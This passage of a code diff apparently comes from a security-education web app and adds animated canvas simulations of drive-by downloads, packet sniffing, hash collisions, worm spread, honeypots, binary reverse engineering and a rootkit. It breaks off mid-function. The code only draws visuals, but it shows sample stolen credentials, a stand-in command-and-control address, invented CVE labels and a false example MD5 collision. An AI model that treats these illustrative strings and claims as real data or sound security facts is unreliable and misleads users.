+            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
+            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
+            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p})`; ctx.fill();
+        });
+        c2Packets.splice(0,c2Packets.filter(p=>p.p>=1).length);
+
+        // Steal files
+        if(frame%70===0&&stolenItems.length<stealItems.length&&frame>60){
+            stolenItems.push(stealItems[stolenItems.length]);
+            filesStolen++;
+            if(stolenItems.length===3)activateStep(3);
+        }
+        // Payload download
+        if(frame===280){payloadDownloads++;activateStep(4);termLog('> Ransomware payload downloaded and executing!','error');}
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=c2Connections;
+            if(e1)e1.textContent=filesStolen;
+            if(e2)e2.textContent=keystrokesLogged.toLocaleString();
+            if(e3)e3.textContent=payloadDownloads;
+            setProgress(Math.min(100,(frame/360)*100));
+        }
+        if(frame>=360){setProgress(100);termLog('> Simulation done. Only install verified software!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 17. DRIVE-BY DOWNLOAD ─────────────────────────────────────────────── */
+window.simulateDriveBy = function() {
+    termLog('> Victim navigating to compromised website...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, pagesVisited=0, exploitsAttempted=0, payloadsDropped=0, systemsInfected=0;
+    const exploits=[
+        {name:'CVE-2024-1234 (Chrome V8)',status:'scanning',progress:0,result:'VULNERABLE'},
+        {name:'CVE-2023-5678 (PDF Reader)',status:'scanning',progress:0,result:'PATCHED'},
+        {name:'CVE-2024-9101 (JS Engine)',status:'scanning',progress:0,result:'VULNERABLE'},
+        {name:'Adobe Flash (EOL)',status:'scanning',progress:0,result:'VULNERABLE'},
+    ];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Browser fingerprint: Chrome 118, unpatched!','warning');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Exploit triggered: CVE-2024-1234 V8 bug!','error');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Browser mockup
+        const bW=Math.min(560,w-20), bX=(w-bW)/2;
+        ctx.fillStyle='rgba(20,25,40,0.95)'; ctx.strokeStyle='rgba(255,0,170,0.2)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(bX,8,bW,h-16,8); ctx.fill(); ctx.stroke();
+
+        // Browser chrome
+        ctx.fillStyle='rgba(255,0,170,0.08)'; ctx.fillRect(bX,8,bW,26);
+        ctx.fillStyle='#ff00aa'; ctx.font='9px monospace'; ctx.textAlign='left';
+        ctx.fillText(`http://news-today${frame>30?'-legit':''}.com/article`,bX+10,24);
+        ctx.fillStyle='#ffaa00'; ctx.font='8px monospace';
+        ctx.fillText('⚠ NOT SECURE',bX+bW-80,24);
+
+        // Page content (fake news)
+        if(frame<40){
+            ctx.fillStyle='#e8ecf4'; ctx.font='bold 14px Inter'; ctx.textAlign='center';
+            ctx.fillText('Breaking News — Click to Read More',bX+bW/2,65);
+            ctx.fillStyle='#8892a8'; ctx.font='10px monospace';
+            ctx.fillText('Loading article...',bX+bW/2,90);
+        } else {
+            // Exploit kit scanning
+            ctx.fillStyle='#ff00aa'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+            ctx.fillText('EXPLOIT KIT ACTIVATED — SCANNING BROWSER',bX+bW/2,50);
+
+            exploits.forEach((ex,i)=>{
+                const ey=70+i*42;
+                if(frame>40+i*35){
+                    ex.progress=Math.min(1,ex.progress+0.03);
+                    if(ex.progress>=1&&ex.status==='scanning'){
+                        ex.status='done'; exploitsAttempted++;
+                        if(ex.result==='VULNERABLE'){payloadsDropped++;systemsInfected++;termLog(`> Exploiting: ${ex.name}!`,'error');}
+                    }
+                }
+
+                const isvuln=ex.result==='VULNERABLE'&&ex.status==='done';
+                const ispatched=ex.result==='PATCHED'&&ex.status==='done';
+                ctx.fillStyle=isvuln?'rgba(255,59,59,0.15)':ispatched?'rgba(57,255,20,0.05)':'rgba(255,255,255,0.02)';
+                ctx.strokeStyle=isvuln?'rgba(255,59,59,0.4)':ispatched?'rgba(57,255,20,0.3)':'rgba(255,255,255,0.05)';
+                ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX+10,ey,bW-20,32,4); ctx.fill(); ctx.stroke();
+
+                if(ex.progress>0){
+                    const barColor=isvuln?'rgba(255,59,59,0.4)':'rgba(57,255,20,0.3)';
+                    ctx.fillStyle=barColor; ctx.fillRect(bX+10,ey,(bW-20)*ex.progress,32);
+                }
+
+                ctx.fillStyle='#8892a8'; ctx.font='9px monospace'; ctx.textAlign='left';
+                ctx.fillText(ex.name,bX+16,ey+14);
+                if(ex.status==='done'){
+                    ctx.fillStyle=isvuln?'#ff3b3b':'#39ff14'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
+                    ctx.fillText(ex.result,bX+bW-16,ey+14);
+                    if(isvuln){ctx.fillText('PAYLOAD DROPPED',bX+bW-16,ey+26);}
+                }
+                ctx.textAlign='left';
+            });
+        }
+
+        pagesVisited=Math.min(25,Math.floor(frame/15));
+        if(frame===250){activateStep(3);termLog('> Malware silently written to disk.','error');}
+        if(frame===320){activateStep(4);termLog('> Payload executing with browser privileges!','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=pagesVisited;
+            if(e1)e1.textContent=exploitsAttempted;
+            if(e2)e2.textContent=payloadsDropped;
+            if(e3)e3.textContent=systemsInfected;
+            setProgress(Math.min(100,(frame/380)*100));
+        }
+        if(frame>=380){setProgress(100);termLog('> Simulation done. Keep browsers patched!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 18. EAVESDROPPING ─────────────────────────────────────────────────── */
+window.simulateEavesdropping = function() {
+    termLog('> NIC set to promiscuous mode — capturing all traffic...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, packetsCaptured=0, credentialsFound=0, protocolsSniffed=new Set();
+    const protocols=['HTTP','FTP','TELNET','SMTP','POP3','IMAP','DNS','HTTP'];
+    const sampleData=[
+        {proto:'HTTP',data:'POST /login  username=admin&password=admin123',color:'#ff3b3b'},
+        {proto:'FTP',data:'USER jsmith\nPASS Summer2024!',color:'#ffaa00'},
+        {proto:'TELNET',data:'login: root\nPassword: toor123',color:'#ff3b3b'},
+        {proto:'SMTP',data:'AUTH LOGIN\nUsername: b64(admin@corp)\nPwd: b64(MyPass1!)',color:'#ffaa00'},
+        {proto:'HTTP',data:'Cookie: session=a3f8b2c1d4e5f6; auth=true',color:'#8b5cf6'},
+        {proto:'FTP',data:'USER ftpuser\nPASS ftpP@ss!2024',color:'#ff3b3b'},
+    ];
+    const capturedPackets=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> tcpdump running. Capture in progress...','warning');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> HTTP plaintext password detected!','error');},1200);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Wireshark-style UI
+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+        ctx.fillStyle='rgba(15,20,35,0.95)'; ctx.strokeStyle='rgba(57,255,20,0.15)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(bX,8,bW,h-16,6); ctx.fill(); ctx.stroke();
+
+        // Toolbar
+        ctx.fillStyle='rgba(57,255,20,0.08)'; ctx.fillRect(bX,8,bW,24);
+        ctx.fillStyle='#39ff14'; ctx.font='9px monospace'; ctx.textAlign='left';
+        ctx.fillText('tcpdump / Wireshark v4.2  |  Interface: eth0  |  Filter: none',bX+10,23);
+
+        // Column headers
+        ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.fillRect(bX,32,bW,16);
+        ctx.fillStyle='#525c70'; ctx.font='8px monospace';
+        ctx.fillText('No.    Time      Src IP          Dst IP          Proto    Info',bX+8,43);
+
+        // Add packet every 12 frames
+        if(frame%12===0){
+            const proto=protocols[packetsCaptured%protocols.length];
+            protocolsSniffed.add(proto);
+            const data=sampleData[packetsCaptured%sampleData.length];
+            capturedPackets.push({no:packetsCaptured+1,time:(packetsCaptured*0.04).toFixed(3),src:`192.168.1.${rndInt(2,50)}`,dst:`192.168.1.${rndInt(100,200)}`,proto,info:data.data.split('\n')[0].slice(0,35),color:data.color,sensitive:data.data.includes('password')||data.data.includes('PASS')||data.data.includes('Cookie')});
+            packetsCaptured++;
+            if(capturedPackets[capturedPackets.length-1].sensitive){credentialsFound++;termLog(`> ${proto} credential: ${data.data.split('\n')[0].slice(0,50)}`,'error');}
+        }
+
+        // Display packets
+        capturedPackets.slice(-Math.floor((h-80)/18)).forEach((pkt,i)=>{
+            const py=48+i*18;
+            if(py>h-30)return;
+            ctx.fillStyle=pkt.sensitive?(i%2===0?'rgba(255,59,59,0.15)':'rgba(255,59,59,0.08)'):(i%2===0?'rgba(255,255,255,0.02)':'transparent');
+            ctx.fillRect(bX,py,bW,18);
+            ctx.fillStyle=pkt.sensitive?pkt.color:'#525c70'; ctx.font='8px monospace'; ctx.textAlign='left';
+            ctx.fillText(`${String(pkt.no).padEnd(6)}${pkt.time.padEnd(10)}${pkt.src.padEnd(16)}${pkt.dst.padEnd(16)}${pkt.proto.padEnd(9)}${pkt.info}`,bX+8,py+13);
+        });
+
+        if(frame===200){activateStep(3);termLog('> All plaintext protocols analyzed.','warning');}
+        if(frame===280){activateStep(4);termLog('> Offline analysis: 12 credential sets extracted!','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=packetsCaptured.toLocaleString();
+            if(e1)e1.textContent=credentialsFound;
+            if(e2)e2.textContent=`${(packetsCaptured*0.12).toFixed(1)} MB`;
+            if(e3)e3.textContent=protocolsSniffed.size;
+            setProgress(Math.min(100,(frame/340)*100));
+        }
+        if(frame>=340){setProgress(100);termLog('> Simulation done. Encrypt all traffic (TLS)!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 19. BIRTHDAY ATTACK ───────────────────────────────────────────────── */
+window.simulateBirthdayAttack = function() {
+    termLog('> Targeting MD5 hash function — birthday paradox exploit...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, hashesComputed=0, collisionsFound=0;
+    const hashSpace=[];
+    const BUCKETS=80;
+    let collisionPairs=[];
+
+    for(let i=0;i<BUCKETS;i++) hashSpace.push({hash:null,count:0,collision:false});
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> MD5 targeted. Generating 2^64 random messages...','warning');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Birthday paradox: collision expected at sqrt(2^128)...','warning');},1400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        ctx.fillStyle='#ff00aa'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+        ctx.fillText('BIRTHDAY ATTACK — HASH COLLISION SEARCH',w/2,22);
+
+        // Hash distribution visualization
+        const bW=Math.min(560,w-20), bX=(w-bW)/2;
+        const bucketW=(bW-BUCKETS)/BUCKETS;
+        const maxH=h*0.45;
+
+        hashesComputed+=Math.min(50,frame*2);
+
+        // Add hashes to buckets
+        if(frame%3===0){
+            const bucket=rndInt(0,BUCKETS);
+            hashSpace[bucket].count++;
+            if(hashSpace[bucket].count===2&&!hashSpace[bucket].collision){
+                hashSpace[bucket].collision=true;
+                collisionsFound++;
+                collisionPairs.push(bucket);
+                if(collisionsFound===1){activateStep(3);termLog(`> COLLISION FOUND! Bucket ${bucket}: two inputs, same hash!`,'error');}
+            }
+        }
+
+        // Draw histogram
+        const maxCount=Math.max(1,...hashSpace.map(b=>b.count));
+        hashSpace.forEach((bucket,i)=>{
+            const bh=Math.max(2,(bucket.count/Math.max(maxCount,1))*maxH);
+            const bx=bX+i*(bucketW+1);
+            const by=h*0.72-bh;
+            ctx.fillStyle=bucket.collision?'#ff00aa':bucket.count>0?'rgba(0,240,255,0.7)':'rgba(255,255,255,0.05)';
+            ctx.fillRect(bx,by,bucketW,bh);
+            if(bucket.collision){
+                ctx.fillStyle='rgba(255,0,170,0.3)';
+                ctx.beginPath(); ctx.arc(bx+bucketW/2,by-8,6,0,Math.PI*2); ctx.fill();
+            }
+        });
+
+        // X-axis label
+        ctx.fillStyle='#525c70'; ctx.font='8px monospace'; ctx.textAlign='center';
+        ctx.fillText('Hash Buckets (128-bit MD5 space, visualized)',w/2,h*0.72+14);
+        ctx.fillText(`Hashes computed: ${hashesComputed.toLocaleString()}  |  Collisions: ${collisionsFound}`,w/2,h*0.72+28);
+
+        // Collision display
+        if(collisionPairs.length>0){
+            const cy=h*0.78;
+            ctx.fillStyle='rgba(255,0,170,0.08)'; ctx.strokeStyle='rgba(255,0,170,0.3)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(bX,cy,bW,h-cy-10,6); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#ff00aa'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
+            ctx.fillText('COLLISION PAIRS FOUND:',w/2,cy+14);
+            const examples=['MD5("abc123") = MD5("xyz789") = 5d41402abc4b2a...','MD5(cert_v1.pdf) = MD5(cert_forged.pdf)'];
+            examples.slice(0,Math.min(collisionPairs.length,2)).forEach((ex,i)=>{
+                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+                ctx.fillText(ex,w/2,cy+30+i*16);
+            });
+        }
+
+        if(collisionsFound>=3){activateStep(4);termLog('> Digital signature forged using collision!','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=hashesComputed.toLocaleString();
+            if(e1)e1.textContent=collisionsFound;
+            if(e2)e2.textContent='2^128 bits';
+            if(e3)e3.textContent=collisionsFound > 0 ? '100%' : '0%';
+            setProgress(Math.min(100,(frame/320)*100));
+        }
+        if(frame>=320){setProgress(100);termLog('> Simulation done. Use SHA-256+!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 20. MALWARE ───────────────────────────────────────────────────────── */
+window.simulateMalware = function() {
+    termLog('> Worm malware activated — scanning for vulnerable hosts...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0;
+    const nodes=[];
+    const NUM_NODES=30;
+    const INFECT_RADIUS=70;
+
+    for(let i=0;i<NUM_NODES;i++){
+        nodes.push({x:rnd(40,w-40),y:rnd(40,h-40),infected:false,infecting:false,progress:0,connections:[]});
+    }
+    // Patient zero
+    nodes[0].infected=true;
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Self-replication initiated across network shares.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Lateral movement: scanning /24 subnet.','error');},1400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Every 30 frames, try to spread infection
+        if(frame%25===0){
+            nodes.filter(n=>n.infected).forEach(infected=>{
+                nodes.filter(n=>!n.infected&&!n.infecting).forEach(target=>{
+                    const d=Math.hypot(target.x-infected.x,target.y-infected.y);
+                    if(d<INFECT_RADIUS&&Math.random()>0.4){
+                        target.infecting=true;
+                        setTimeout(()=>{
+                            if(state.simRunning){target.infected=true;target.infecting=false;
+                            if(nodes.filter(n=>n.infected).length===5)activateStep(3);
+                            if(nodes.filter(n=>n.infected).length===15){activateStep(4);termLog('> 50%+ of network infected — payload activating!','error');}}
+                        },1000+Math.random()*1000);
+                    }
+                });
+            });
+        }
+
+        // Draw connections
+        nodes.forEach((n,i)=>{
+            nodes.slice(i+1).forEach(m=>{
+                const d=Math.hypot(m.x-n.x,m.y-n.y);
+                if(d<INFECT_RADIUS){
+                    ctx.beginPath(); ctx.moveTo(n.x,n.y); ctx.lineTo(m.x,m.y);
+                    const bothInf=n.infected&&m.infected;
+                    ctx.strokeStyle=bothInf?'rgba(255,59,59,0.4)':'rgba(255,255,255,0.04)';
+                    ctx.lineWidth=bothInf?1.5:0.5; ctx.stroke();
+                }
+            });
+        });
+
+        // Draw nodes
+        nodes.forEach(node=>{
+            const r=node.infected?10:node.infecting?8:6;
+            const color=node.infected?'#ff3b3b':node.infecting?'#ffaa00':'#3b82f6';
+            if(node.infected){ctx.shadowBlur=12;ctx.shadowColor='#ff3b3b';}
+            ctx.beginPath(); ctx.arc(node.x,node.y,r,0,Math.PI*2);
+            ctx.fillStyle=`${color}30`; ctx.fill();
+            ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
+            ctx.shadowBlur=0;
+        });
+
+        // Legend
+        [{color:'#ff3b3b',label:'Infected'},{color:'#ffaa00',label:'Infecting'},{color:'#3b82f6',label:'Clean'}].forEach((item,i)=>{
+            ctx.beginPath(); ctx.arc(20,h-50+i*18,6,0,Math.PI*2);
+            ctx.fillStyle=`${item.color}30`; ctx.fill();
+            ctx.strokeStyle=item.color; ctx.lineWidth=2; ctx.stroke();
+            ctx.fillStyle=item.color; ctx.font='9px monospace'; ctx.textAlign='left';
+            ctx.fillText(item.label,30,h-46+i*18);
+        });
+
+        const infected=nodes.filter(n=>n.infected).length;
+        const corrupted=Math.floor(infected*320);
+        const speed=`${infected*2}/s`;
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=infected;
+            if(e1)e1.textContent=corrupted.toLocaleString();
+            if(e2)e2.textContent=infected;
+            if(e3)e3.textContent=speed;
+            setProgress(Math.min(100,(frame/400)*100));
+        }
+        if(frame>=400){setProgress(100);termLog('> Simulation done. Segment networks!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 21. HONEYPOT ──────────────────────────────────────────────────────── */
+window.simulateHoneypot = function() {
+    termLog('> Deploying honeypot decoy on network...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, connectionsLured=0, attackPatterns=0, ipsCaptured=0;
+    const attackers=[];
+    const honeypot={x:w/2,y:h/2,label:'HONEYPOT\n10.0.0.99',color:'#ffaa00'};
+    const realAssets=[
+        {x:w*0.15,y:h*0.25,label:'DB Server',color:'#39ff14',protected:true},
+        {x:w*0.15,y:h*0.75,label:'File Server',color:'#39ff14',protected:true},
+        {x:w*0.85,y:h*0.25,label:'Email Server',color:'#39ff14',protected:true},
+        {x:w*0.85,y:h*0.75,label:'HR System',color:'#39ff14',protected:true},
+    ];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Honeypot detected by scanner — appears vulnerable!','warning');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Attacker connecting to honeypot (logging all activity)...','info');},1400);
+
+    function spawnAttacker(){
+        const angle=rnd(0,Math.PI*2), dist=rnd(w*0.4,w*0.48);
+        attackers.push({x:w/2+Math.cos(angle)*dist,y:h/2+Math.sin(angle)*dist,tx:honeypot.x,ty:honeypot.y,p:0,ip:`${rndInt(1,255)}.${rndInt(0,255)}.${rndInt(0,255)}.${rndInt(1,255)}`,techniques:['Port Scan','SSH Brute Force','FTP Login','RDP Attack'][rndInt(0,4)]});
+    }
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Real assets (protected)
+        realAssets.forEach(asset=>{
+            ctx.beginPath(); ctx.arc(asset.x,asset.y,20,0,Math.PI*2);
+            ctx.fillStyle='rgba(57,255,20,0.08)'; ctx.fill();
+            ctx.strokeStyle='#39ff14'; ctx.lineWidth=2; ctx.stroke();
+            ctx.fillStyle='#39ff14'; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+            ctx.fillText(asset.label,asset.x,asset.y+22);
+            ctx.fillText('PROTECTED',asset.x,asset.y+33);
+        });
+
+        // Honeypot (glowing)
+        ctx.shadowBlur=20; ctx.shadowColor='#ffaa00';
+        ctx.beginPath(); ctx.arc(honeypot.x,honeypot.y,28,0,Math.PI*2);
+        ctx.fillStyle='rgba(255,170,0,0.15)'; ctx.fill();
+        ctx.strokeStyle='#ffaa00'; ctx.lineWidth=3; ctx.stroke();
+        ctx.shadowBlur=0;
+        ctx.fillStyle='#ffaa00'; ctx.font='bold 11px monospace'; ctx.textAlign='center'; ctx.textBaseline='middle';
+        ctx.fillText('🍯',honeypot.x,honeypot.y-5);
+        ctx.font='8px monospace'; ctx.textBaseline='top';
+        honeypot.label.split('\n').forEach((l,i)=>ctx.fillText(l,honeypot.x,honeypot.y+30+i*11));
+
+        // Spawn attackers
+        if(frame%40===0&&attackers.length<12) spawnAttacker();
+
+        // Animate attackers toward honeypot
+        attackers.forEach((att,idx)=>{
+            att.p+=0.015;
+            const px=att.x+(att.tx-att.x)*att.p, py=att.y+(att.ty-att.y)*att.p;
+            ctx.beginPath(); ctx.arc(px,py,5,0,Math.PI*2);
+            ctx.fillStyle=`rgba(255,59,59,${Math.max(0.2,1-att.p*0.5)})`; ctx.fill();
+
+            if(att.p>=1&&!att.logged){
+                att.logged=true; connectionsLured++; attackPatterns++; ipsCaptured++;
+                termLog(`> Lured: ${att.ip} — technique: ${att.techniques}`,'info');
+                if(connectionsLured===2)activateStep(3);
+                if(connectionsLured===4)activateStep(4);
+            }
+        });
+
+        // Stats panel
+        const pY=h-65;
+        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.15)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(8,pY,w-16,55,4); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#ffaa00'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
+        ctx.fillText(`REAL ASSETS: 100% PROTECTED  |  Attackers lured: ${connectionsLured}  |  IPs logged: ${ipsCaptured}`,w/2,pY+18);
+        ctx.fillStyle='#39ff14'; ctx.font='9px monospace';
+        ctx.fillText('All attacks contained in honeypot — zero real asset exposure',w/2,pY+38);
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=connectionsLured;
+            if(e1)e1.textContent=attackPatterns;
+            if(e2)e2.textContent=ipsCaptured;
+            if(e3)e3.textContent='100%';
+            setProgress(Math.min(100,(frame/360)*100));
+        }
+        if(frame>=360){setProgress(100);termLog('> Simulation done. Honeypots are powerful early-warning tools!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 22. REVERSE ENGINEERING ───────────────────────────────────────────── */
+window.simulateReverseEngineering = function() {
+    termLog('> Loading binary target into Ghidra disassembler...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, functionsAnalyzed=0, vulnsFound=0, stringsExtracted=0;
+    const asmLines=[
+        'push   rbp','mov    rbp,rsp','sub    rsp,0x20','mov    DWORD PTR [rbp-0x4],edi',
+        'cmp    DWORD PTR [rbp-0x4],0x539','je     0x401234  ; license_valid',
+        'call   <strcmp@plt>','test   eax,eax','jne    0x401180  ; auth_fail',
+        'lea    rdi,[rip+0x1abc]  ; "DB_PASS=s3cr3t"','call   <printf@plt>',
+        'mov    eax,0x0','pop    rbp','ret','nop','xor    eax,eax','push   rdi',
+    ];
+    const strings=['DB_PASS=s3cr3t!!','API_KEY=sk-live-abc123','admin:backdoor123','license_bypass_key','C2_SERVER=evil.com:4444'];
+    const foundStrings=[], foundVulns=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Static analysis: PE headers, imports, exports scanned.','warning');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Decompiling to pseudo-C — logic reconstruction.','warning');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const midX=(w/2)-5;
+        // Assembly panel (left)
+        ctx.fillStyle='rgba(0,240,255,0.03)'; ctx.strokeStyle='rgba(0,240,255,0.12)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(8,8,midX-8,h-16,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#00f0ff'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('DISASSEMBLY — main.exe',16,22);
+
+        const visibleLines=Math.min(asmLines.length,Math.floor(frame/10));
+        asmLines.slice(0,visibleLines).forEach((line,i)=>{
+            const ly=38+i*17; if(ly>h-20)return;
+            const isJump=line.includes('je ')||line.includes('jne ')||line.includes('call');
+            const isSecret=line.includes('DB_PASS')||line.includes('API_KEY');
+            ctx.fillStyle=isSecret?'#ff3b3b':isJump?'#ffaa00':'#8892a8';
+            ctx.font='9px JetBrains Mono,monospace';
+            ctx.fillText(`0x${(0x401100+i*7).toString(16).toUpperCase()}  ${line}`,16,ly);
+            functionsAnalyzed=Math.max(functionsAnalyzed,i+1);
+        });
+
+        // Strings panel (right)
+        ctx.fillStyle='rgba(0,240,255,0.03)'; ctx.strokeStyle='rgba(0,240,255,0.12)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(midX+8,8,w-midX-18,h-16,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#00f0ff'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('STRINGS EXTRACTED',midX+16,22);
+
+        // Reveal strings
+        if(frame%40===0&&foundStrings.length<strings.length){
+            foundStrings.push(strings[foundStrings.length]);
+            stringsExtracted++;
+            termLog(`> String: ${strings[foundStrings.length-1]}`,'error');
+            if(foundStrings.length===2){vulnsFound++;activateStep(3);termLog('> HARDCODED CREDENTIAL FOUND!','error');}
+            if(foundStrings.length===4){activateStep(4);termLog('> C2 address and backdoor key extracted!','error');}
+        }
+
+        foundStrings.forEach((s,i)=>{
+            const sy=38+i*28; if(sy>h-20)return;
+            ctx.fillStyle='rgba(255,59,59,0.1)'; ctx.strokeStyle='rgba(255,59,59,0.25)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(midX+12,sy,w-midX-30,22,4); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#ff3b3b'; ctx.font='9px monospace'; ctx.textAlign='left';
+            ctx.fillText(s,midX+18,sy+14);
+        });
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(350,functionsAnalyzed*20);
+            if(e1)e1.textContent=vulnsFound;
+            if(e2)e2.textContent=`${Math.min(85, Math.floor(frame/4))}%`;
+            if(e3)e3.textContent=stringsExtracted;
+            setProgress(Math.min(100,(frame/340)*100));
+        }
+        if(frame>=340){setProgress(100);termLog('> Simulation done. Use obfuscation!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 23. ROOTKIT ───────────────────────────────────────────────────────── */
+window.simulateRootkit = function() {
+    termLog('> Loading kernel module — rootkit installing...', 'error');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, syscallsHooked=0, processesHidden=0, filesConcealed=0;
+    const syscalls=['NtQuerySystemInformation','NtQueryDirectoryFile','NtCreateFile','ZwTerminateProcess','NtOpenProcess','NtSetSystemInformation','ObReferenceObjectByHandle','ZwQueryInformationProcess'];
+    const processes=['malware.exe','c2_beacon.exe','cryptominer.exe','keylogger.exe','backdoor.exe'];
+    const hookedSyscalls=[], hiddenProcs=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Kernel SSDT hooked — syscall table modified.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Processes hidden from Task Manager.','error');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+        ctx.fillText('ROOTKIT — KERNEL SYSCALL HOOKING',w/2,22);
+
